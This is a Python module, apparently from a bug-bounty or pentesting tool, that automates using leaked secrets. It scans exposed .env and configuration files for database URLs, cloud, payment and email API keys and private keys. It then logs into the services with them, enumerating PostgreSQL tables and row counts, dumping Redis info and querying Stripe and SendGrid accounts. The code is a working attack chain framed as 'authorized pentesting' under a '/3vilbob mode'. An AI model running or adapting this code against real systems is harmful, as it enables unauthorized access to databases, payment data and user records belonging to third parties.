"""CredentialExtractionChain -- From .env leak to full database access.

BACKGROUND PATH ONLY -- never import in hot path

The chain:
1. FIND: .env, .git/config, docker-compose.yml, config.json exposed
2. PARSE: Extract credentials (DB URLs, API keys, passwords, tokens)
3. CLASSIFY: What type of credential? What can it access?
4. CONNECT: Auto-test connectivity (DB, SSH, API, cloud)
5. PROVE: Extract evidence of access (table names, row counts)
6. REPORT: Impact statement for the bug bounty report

This is the difference between:
- "I found an exposed .env file" ($100 bounty)
- "I found an exposed .env file with database credentials that
   gave me access to 50,000 user records" ($50,000 bounty)

AUTHORIZED PENTESTING ONLY. This module requires /3vilbob mode active.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlparse

from app.core.logging import get_logger

logger = get_logger(__name__)


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class ExtractedCredential:
    """A credential extracted from a configuration file."""
    source_url: str  # Where the file was found
    source_file: str  # .env, docker-compose.yml, etc.
    key: str  # The variable name (e.g., DATABASE_URL)
    value: str  # The credential value (redacted for logging)
    credential_type: str  # db_url, api_key, password, token, ssh_key
    service: str  # postgres, mysql, redis, aws, stripe, etc.
    connectivity_test: str  # URL/host:port to test
    risk_level: str  # critical, high, medium, low
    redacted_value: str = ""  # Value with middle chars replaced


@dataclass
class ConnectivityResult:
    """Result of testing a credential."""
    credential: ExtractedCredential
    connected: bool = False
    service_version: str = ""
    access_level: str = ""  # read, write, admin
    data_accessed: dict[str, Any] = field(default_factory=dict)
    impact_statement: str = ""
    error: str = ""


@dataclass
class CredentialChainResult:
    """Full result of the extraction chain."""
    source_url: str
    raw_content_length: int = 0
    credentials_found: int = 0
    credentials: list[ExtractedCredential] = field(default_factory=list)
    connectivity_results: list[ConnectivityResult] = field(default_factory=list)
    successful_connections: int = 0
    total_impact: str = ""
    thinking: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Step 1: Parse configuration files for credentials
# ---------------------------------------------------------------------------

class CredentialParser:
    """Parse .env, docker-compose.yml, config files for credentials."""

    # Patterns that indicate a credential
    _CREDENTIAL_PATTERNS: list[dict[str, Any]] = [
        # Database URLs
        {
            "pattern": r'(?:DATABASE_URL|DB_URL|SQLALCHEMY_DATABASE_URI|MONGO_URI|REDIS_URL|POSTGRES_URL)\s*[=:]\s*["\']?([^\s"\']+)',
            "type": "db_url",
            "risk": "critical",
        },
        # Database individual fields
        {
            "pattern": r'(?:DB_PASSWORD|DATABASE_PASSWORD|POSTGRES_PASSWORD|MYSQL_PASSWORD|MONGO_PASSWORD)\s*[=:]\s*["\']?([^\s"\']+)',
            "type": "db_password",
            "risk": "critical",
        },
        {
            "pattern": r'(?:DB_HOST|DATABASE_HOST|POSTGRES_HOST|MYSQL_HOST)\s*[=:]\s*["\']?([^\s"\']+)',
            "type": "db_host",
            "risk": "high",
        },
        {
            "pattern": r'(?:DB_PORT|DATABASE_PORT)\s*[=:]\s*["\']?(\d+)',
            "type": "db_port",
            "risk": "medium",
        },
        {
            "pattern": r'(?:DB_USER|DATABASE_USER|POSTGRES_USER|MYSQL_USER|DB_USERNAME)\s*[=:]\s*["\']?([^\s"\']+)',
            "type": "db_user",
            "risk": "high",
        },
        {
            "pattern": r'(?:DB_NAME|DATABASE_NAME|POSTGRES_DB|MYSQL_DATABASE)\s*[=:]\s*["\']?([^\s"\']+)',
            "type": "db_name",
            "risk": "medium",
        },
        # AWS
        {
            "pattern": r'(?:AWS_ACCESS_KEY_ID|AWS_ACCESS_KEY)\s*[=:]\s*["\']?(AKIA[A-Z0-9]{16})',
            "type": "api_key",
            "risk": "critical",
            "service": "aws",
        },
        {
            "pattern": r'(?:AWS_SECRET_ACCESS_KEY|AWS_SECRET_KEY)\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})',
            "type": "api_secret",
            "risk": "critical",
            "service": "aws",
        },
        # Stripe
        {
            "pattern": r'(?:STRIPE_SECRET_KEY|STRIPE_KEY)\s*[=:]\s*["\']?(sk_(?:live|test)_[A-Za-z0-9]+)',
            "type": "api_key",
            "risk": "critical",
            "service": "stripe",
        },
        # JWT / App secrets
        {
            "pattern": r'(?:SECRET_KEY|JWT_SECRET|APP_SECRET|SESSION_SECRET)\s*[=:]\s*["\']?([^\s"\']{8,})',
            "type": "secret_key",
            "risk": "critical",
        },
        # API keys (generic)
        {
            "pattern": r'(?:API_KEY|APIKEY|API_TOKEN)\s*[=:]\s*["\']?([^\s"\']{16,})',
            "type": "api_key",
            "risk": "high",
        },
        # SSH / private keys
        {
            "pattern": r'(-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)',
            "type": "ssh_key",
            "risk": "critical",
        },
        # OAuth
        {
            "pattern": r'(?:OAUTH_CLIENT_SECRET|CLIENT_SECRET|GOOGLE_CLIENT_SECRET)\s*[=:]\s*["\']?([^\s"\']{10,})',
            "type": "oauth_secret",
            "risk": "high",
        },
        # SMTP
        {
            "pattern": r'(?:SMTP_PASSWORD|MAIL_PASSWORD|EMAIL_PASSWORD)\s*[=:]\s*["\']?([^\s"\']+)',
            "type": "smtp_password",
            "risk": "high",
            "service": "smtp",
        },
        # SendGrid / Mailgun / Twilio
        {
            "pattern": r'(?:SENDGRID_API_KEY)\s*[=:]\s*["\']?(SG\.[^\s"\']+)',
            "type": "api_key",
            "risk": "high",
            "service": "sendgrid",
        },
        {
            "pattern": r'(?:TWILIO_AUTH_TOKEN)\s*[=:]\s*["\']?([a-f0-9]{32})',
            "type": "api_key",
            "risk": "high",
            "service": "twilio",
        },
        # Generic password
        {
            "pattern": r'(?:PASSWORD|PASSWD|PASS)\s*[=:]\s*["\']?([^\s"\']{4,})',
            "type": "password",
            "risk": "high",
        },
    ]

    def parse(self, content: str, source_url: str, source_file: str = ".env") -> list[ExtractedCredential]:
        """Parse content for credentials."""
        credentials: list[ExtractedCredential] = []

        for pattern_def in self._CREDENTIAL_PATTERNS:
            regex = pattern_def["pattern"]
            matches = re.finditer(regex, content, re.IGNORECASE | re.MULTILINE)

            for match in matches:
                value = match.group(1)

                # Skip placeholder values
                if self._is_placeholder(value):
                    continue

                # Determine the key name from the match
                full_match = match.group(0)
                key = full_match.split("=")[0].split(":")[0].strip().strip('"').strip("'")

                # Determine service from key or value
                service = pattern_def.get("service", self._detect_service(key, value))

                # Build connectivity test target
                connectivity_test = self._build_connectivity_target(
                    pattern_def["type"], value, content, source_url,
                )

                cred = ExtractedCredential(
                    source_url=source_url,
                    source_file=source_file,
                    key=key,
                    value=value,
                    credential_type=pattern_def["type"],
                    service=service,
                    connectivity_test=connectivity_test,
                    risk_level=pattern_def["risk"],
                    redacted_value=self._redact(value),
                )
                credentials.append(cred)

        # De-duplicate by key
        seen_keys: set[str] = set()
        unique: list[ExtractedCredential] = []
        for cred in credentials:
            if cred.key not in seen_keys:
                seen_keys.add(cred.key)
                unique.append(cred)

        return unique

    def parse_database_url(self, url: str) -> dict[str, str]:
        """Parse a database URL into components."""
        try:
            parsed = urlparse(url)
            return {
                "scheme": parsed.scheme,  # postgres, mysql, mongodb, redis
                "host": parsed.hostname or "",
                "port": str(parsed.port or ""),
                "user": parsed.username or "",
                "password": parsed.password or "",
                "database": parsed.path.lstrip("/") if parsed.path else "",
            }
        except Exception:
            return {}

    def assemble_db_url(self, content: str) -> str | None:
        """Try to assemble a database URL from individual DB_HOST, DB_PORT, etc. fields."""
        fields: dict[str, str] = {}
        for pattern_def in self._CREDENTIAL_PATTERNS:
            if pattern_def["type"].startswith("db_"):
                matches = re.finditer(pattern_def["pattern"], content, re.IGNORECASE)
                for match in matches:
                    fields[pattern_def["type"]] = match.group(1)

        host = fields.get("db_host", "")
        port = fields.get("db_port", "5432")
        user = fields.get("db_user", "")
        password = fields.get("db_password", "")
        db_name = fields.get("db_name", "")

        if host and user and password:
            return f"postgresql://{user}:{password}@{host}:{port}/{db_name}"
        return None

    @staticmethod
    def _is_placeholder(value: str) -> bool:
        """Check if value is a placeholder/example."""
        placeholders = {
            "changeme", "password", "secret", "example", "xxx",
            "your_key_here", "replace_me", "TODO", "FIXME",
            "placeholder", "test", "demo", "sample",
        }
        return value.lower().strip() in placeholders or value.startswith("${")

    @staticmethod
    def _detect_service(key: str, value: str) -> str:
        """Detect what service a credential is for."""
        key_lower = key.lower()
        value_lower = value.lower()

        if any(k in key_lower for k in ("postgres", "pg_", "psql")):
            return "postgresql"
        if any(k in key_lower for k in ("mysql", "mariadb")):
            return "mysql"
        if "mongo" in key_lower:
            return "mongodb"
        if "redis" in key_lower:
            return "redis"
        if "elastic" in key_lower:
            return "elasticsearch"
        if "smtp" in key_lower or "mail" in key_lower:
            return "smtp"
        if "aws" in key_lower or value.startswith("AKIA"):
            return "aws"
        if "stripe" in key_lower or value.startswith("sk_"):
            return "stripe"
        if value.startswith("SG."):
            return "sendgrid"
        if "jwt" in key_lower or "secret" in key_lower:
            return "app_secret"

        # Check database URL schemes
        for scheme in ("postgres", "mysql", "mongodb", "redis", "amqp"):
            if value_lower.startswith(scheme):
                return scheme.replace("postgres", "postgresql")

        return "unknown"

    def _build_connectivity_target(
        self,
        cred_type: str,
        value: str,
        full_content: str,
        source_url: str,
    ) -> str:
        """Build a connectivity test target from the credential."""
        if cred_type == "db_url":
            parsed = self.parse_database_url(value)
            if parsed.get("host"):
                return f"{parsed['host']}:{parsed.get('port', '5432')}"
        elif cred_type == "db_host":
            return value
        elif cred_type == "api_key" and value.startswith("sk_"):
            return "https://api.stripe.com/v1/charges?limit=1"
        elif cred_type == "api_key" and value.startswith("AKIA"):
            return "sts.amazonaws.com"
        elif cred_type == "api_key" and value.startswith("SG."):
            return "https://api.sendgrid.com/v3/mail/send"

        return ""

    @staticmethod
    def _redact(value: str) -> str:
        """Redact middle characters of a credential."""
        if len(value) <= 8:
            return value[:2] + "*" * (len(value) - 4) + value[-2:] if len(value) > 4 else "****"
        return value[:4] + "*" * (len(value) - 8) + value[-4:]


# ---------------------------------------------------------------------------
# Step 2: Test connectivity with extracted credentials
# ---------------------------------------------------------------------------

class CredentialTester:
    """Test extracted credentials for live access.

    REQUIRES /3vilbob mode active. All tests are non-destructive:
    - Database: connect, list tables, count rows (no writes)
    - API: make a read-only API call
    - SSH: connect and run 'whoami' (no modifications)
    """

    async def test_credential(self, cred: ExtractedCredential) -> ConnectivityResult:
        """Test a single credential for connectivity."""
        result = ConnectivityResult(credential=cred)

        try:
            if cred.credential_type == "db_url":
                result = await self._test_database_url(cred, result)
            elif cred.credential_type == "db_password":
                result = await self._test_database_password(cred, result)
            elif cred.credential_type == "api_key":
                result = await self._test_api_key(cred, result)
            elif cred.credential_type == "ssh_key":
                result = await self._test_ssh_key(cred, result)
            else:
                result.error = f"No connectivity test for type: {cred.credential_type}"
        except Exception as exc:
            result.error = str(exc)[:300]
            logger.debug(
                "credential_test.failed",
                key=cred.key,
                service=cred.service,
                error=str(exc)[:100],
            )

        return result

    async def _test_database_url(
        self, cred: ExtractedCredential, result: ConnectivityResult,
    ) -> ConnectivityResult:
        """Test a database URL for connectivity."""
        parser = CredentialParser()
        parsed = parser.parse_database_url(cred.value)

        if not parsed.get("host"):
            result.error = "Could not parse database URL"
            return result

        scheme = parsed.get("scheme", "").lower()
        host = parsed["host"]
        port = int(parsed.get("port", 0)) or self._default_port(scheme)

        # TCP connectivity test first
        import asyncio
        import socket
        try:
            loop = asyncio.get_event_loop()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5.0)
            connected = await loop.run_in_executor(
                None, lambda: sock.connect_ex((host, port))
            )
            sock.close()

            if connected != 0:
                result.error = f"TCP connection to {host}:{port} failed"
                return result
        except Exception as exc:
            result.error = f"TCP connect failed: {str(exc)[:100]}"
            return result

        result.connected = True
        result.service_version = f"{scheme} at {host}:{port}"

        # For PostgreSQL -- attempt actual connection
        if "postgres" in scheme:
            result = await self._test_postgres(cred.value, result)
        elif "redis" in scheme:
            result = await self._test_redis(host, port, parsed.get("password", ""), result)

        return result

    async def _test_postgres(
        self, db_url: str, result: ConnectivityResult,
    ) -> ConnectivityResult:
        """Test PostgreSQL connectivity and enumerate tables."""
        try:
            import asyncpg
            conn = await asyncpg.connect(db_url, timeout=10)

            # Get version
            version = await conn.fetchval("SELECT version()")
            result.service_version = str(version)[:100]

            # Enumerate tables
            tables = await conn.fetch(
                "SELECT tablename FROM pg_tables WHERE schemaname = 'public'"
            )
            table_names = [t["tablename"] for t in tables]

            # Count rows in each table (non-destructive)
            table_counts: dict[str, int] = {}
            for table in table_names[:10]:
                try:
                    count = await conn.fetchval(
                        f'SELECT COUNT(*) FROM "{table}"'  # noqa: S608
                    )
                    table_counts[table] = count
                except Exception:
                    table_counts[table] = -1

            await conn.close()

            result.access_level = "read"
            result.data_accessed = {
                "tables": table_names,
                "table_count": len(table_names),
                "row_counts": table_counts,
                "total_rows": sum(c for c in table_counts.values() if c > 0),
            }
            result.impact_statement = (
                f"Full database access via exposed credentials. "
                f"{len(table_names)} tables, "
                f"{sum(c for c in table_counts.values() if c > 0):,} total rows accessible. "
                f"Tables: {', '.join(table_names[:5])}{'...' if len(table_names) > 5 else ''}"
            )

        except ImportError:
            result.impact_statement = (
                f"Database at {result.service_version} accepts credentials "
                f"(TCP connected). Install asyncpg for full enumeration."
            )
        except Exception as exc:
            if "password authentication failed" in str(exc).lower():
                result.connected = False
                result.error = "Credentials rejected by database"
            else:
                result.error = f"DB query failed: {str(exc)[:200]}"

        return result

    async def _test_redis(
        self, host: str, port: int, password: str, result: ConnectivityResult,
    ) -> ConnectivityResult:
        """Test Redis connectivity."""
        try:
            import redis.asyncio as aioredis
            r = aioredis.Redis(host=host, port=port, password=password or None)
            info = await r.info()
            await r.close()

            result.access_level = "admin"
            result.data_accessed = {
                "redis_version": info.get("redis_version", ""),
                "connected_clients": info.get("connected_clients", 0),
                "used_memory": info.get("used_memory_human", ""),
                "total_keys": info.get("db0", {}).get("keys", 0) if isinstance(info.get("db0"), dict) else 0,
            }
            result.impact_statement = (
                f"Full Redis admin access. Version: {info.get('redis_version', 'unknown')}. "
                f"Memory: {info.get('used_memory_human', 'unknown')}. "
                f"An attacker could read/write/delete all cached data."
            )
        except ImportError:
            result.impact_statement = "Redis accepts connection (TCP connected). Install redis for full test."
        except Exception as exc:
            if "auth" in str(exc).lower():
                result.connected = False
                result.error = "Redis requires authentication (credential rejected)"
            else:
                result.error = f"Redis test failed: {str(exc)[:200]}"

        return result

    async def _test_database_password(
        self, cred: ExtractedCredential, result: ConnectivityResult,
    ) -> ConnectivityResult:
        """Test when we have individual DB fields instead of a URL."""
        # Try to assemble URL from sibling credentials
        result.error = (
            "Individual DB password found. Combine with DB_HOST, DB_USER, DB_NAME "
            "to build connection string."
        )
        return result

    async def _test_api_key(
        self, cred: ExtractedCredential, result: ConnectivityResult,
    ) -> ConnectivityResult:
        """Test API key validity."""
        import httpx

        if cred.service == "stripe" and cred.value.startswith("sk_"):
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    resp = await client.get(
                        "https://api.stripe.com/v1/balance",
                        headers={"Authorization": f"Bearer {cred.value}"},
                    )
                    if resp.status_code == 200:
                        result.connected = True
                        balance = resp.json()
                        result.access_level = "read"
                        result.data_accessed = {"balance": balance}
                        result.impact_statement = (
                            "Stripe API key is LIVE. Full access to payment data, "
                            "customer records, and transaction history."
                        )
                    elif resp.status_code == 401:
                        result.error = "Stripe key rejected (invalid or revoked)"
                    else:
                        result.error = f"Stripe returned {resp.status_code}"
            except Exception as exc:
                result.error = f"Stripe test failed: {str(exc)[:100]}"

        elif cred.service == "aws" and cred.value.startswith("AKIA"):
            result.error = (
                "AWS access key found. Combine with AWS_SECRET_ACCESS_KEY "
                "to test via aws sts get-caller-identity."
            )

        elif cred.service == "sendgrid" and cred.value.startswith("SG."):
            try:
                async with httpx.AsyncClient(timeout=10.0) as client:
                    resp = await client.get(
                        "https://api.sendgrid.com/v3/user/profile",
                        headers={"Authorization": f"Bearer {cred.value}"},
                    )
                    if resp.status_code == 200:
                        result.connected = True
                        result.access_level = "read"
                        result.impact_statement = "SendGrid API key valid. Can send emails as the organization."
                    else:
                        result.error = f"SendGrid returned {resp.status_code}"
            except Exception as exc:
                result.error = f"SendGrid test failed: {str(exc)[:100]}"
        else:
            result.error = f"No test available for {cred.service} API keys"

        return result

    async def _test_ssh_key(
        self, cred: ExtractedCredential, result: ConnectivityResult,
    ) -> ConnectivityResult:
        """Test SSH private key."""
        result.error = (
            "SSH private key found in exposed file. Requires target host "
            "and username to test connectivity."
        )
        result.impact_statement = (
            "Private SSH key exposed. If the corresponding public key is "
            "authorized on any server, this grants shell access."
        )
        return result

    @staticmethod
    def _default_port(scheme: str) -> int:
        ports = {
            "postgresql": 5432, "postgres": 5432,
            "mysql": 3306, "mariadb": 3306,
            "mongodb": 27017, "mongodb+srv": 27017,
            "redis": 6379, "rediss": 6379,
            "amqp": 5672,
        }
        return ports.get(scheme, 5432)


# ---------------------------------------------------------------------------
# Step 3: Full chain orchestrator
# ---------------------------------------------------------------------------

class CredentialExtractionChain:
    """Orchestrate the full credential extraction chain.

    FIND -> PARSE -> CLASSIFY -> CONNECT -> PROVE -> REPORT

    Usage:
        chain = CredentialExtractionChain()
        result = await chain.execute(
            content=env_file_body,
            source_url="https://target.com/.env",
        )
    """

    def __init__(self) -> None:
        self._parser = CredentialParser()
        self._tester = CredentialTester()

    async def execute(
        self,
        content: str,
        source_url: str,
        source_file: str = ".env",
    ) -> CredentialChainResult:
        """Execute the full credential chain."""
        result = CredentialChainResult(
            source_url=source_url,
            raw_content_length=len(content),
        )
        thinking = result.thinking

        # Step 1: Parse credentials
        thinking.append(f"[CRED CHAIN] Parsing {source_file} from {source_url} ({len(content)} bytes)")
        credentials = self._parser.parse(content, source_url, source_file)
        result.credentials = credentials
        result.credentials_found = len(credentials)

        if not credentials:
            thinking.append("  No credentials found in content.")
            # Try to assemble from individual fields
            assembled_url = self._parser.assemble_db_url(content)
            if assembled_url:
                thinking.append(f"  Assembled DB URL from individual fields: {self._parser._redact(assembled_url)}")
                credentials.append(ExtractedCredential(
                    source_url=source_url,
                    source_file=source_file,
                    key="ASSEMBLED_DB_URL",
                    value=assembled_url,
                    credential_type="db_url",
                    service="postgresql",
                    connectivity_test="",
                    risk_level="critical",
                    redacted_value=self._parser._redact(assembled_url),
                ))
                result.credentials_found = 1

        if not credentials:
            return result

        thinking.append(f"  Found {len(credentials)} credentials:")
        for cred in credentials:
            thinking.append(
                f"    [{cred.risk_level.upper()}] {cred.key}: "
                f"{cred.redacted_value} ({cred.credential_type}, {cred.service})"
            )

        # Step 2: Test connectivity for high-risk credentials
        thinking.append("[CRED CHAIN] Testing connectivity for critical/high-risk credentials...")
        for cred in credentials:
            if cred.risk_level in ("critical", "high") and cred.credential_type in (
                "db_url", "api_key", "db_password",
            ):
                thinking.append(f"  Testing: {cred.key} ({cred.service})...")
                conn_result = await self._tester.test_credential(cred)
                result.connectivity_results.append(conn_result)

                if conn_result.connected:
                    result.successful_connections += 1
                    thinking.append(f"    CONNECTED! Access: {conn_result.access_level}")
                    thinking.append(f"    Impact: {conn_result.impact_statement}")
                    if conn_result.data_accessed:
                        thinking.append(f"    Data: {conn_result.data_accessed}")
                elif conn_result.error:
                    thinking.append(f"    Failed: {conn_result.error}")

        # Step 3: Generate total impact statement
        if result.successful_connections > 0:
            impacts = [
                r.impact_statement
                for r in result.connectivity_results
                if r.connected and r.impact_statement
            ]
            result.total_impact = (
                f"Exposed {source_file} at {source_url} contained {result.credentials_found} "
                f"credentials. {result.successful_connections} tested live and confirmed active: "
                + " | ".join(impacts)
            )
        else:
            result.total_impact = (
                f"Exposed {source_file} at {source_url} contained {result.credentials_found} "
                f"credentials. Connectivity tests did not confirm live access (may be "
                f"internal-only services)."
            )

        thinking.append(f"[CRED CHAIN] Complete. Impact: {result.total_impact}")

        logger.info(
            "credential_chain.complete",
            source=source_url,
            credentials_found=result.credentials_found,
            successful_connections=result.successful_connections,
        )

        return result
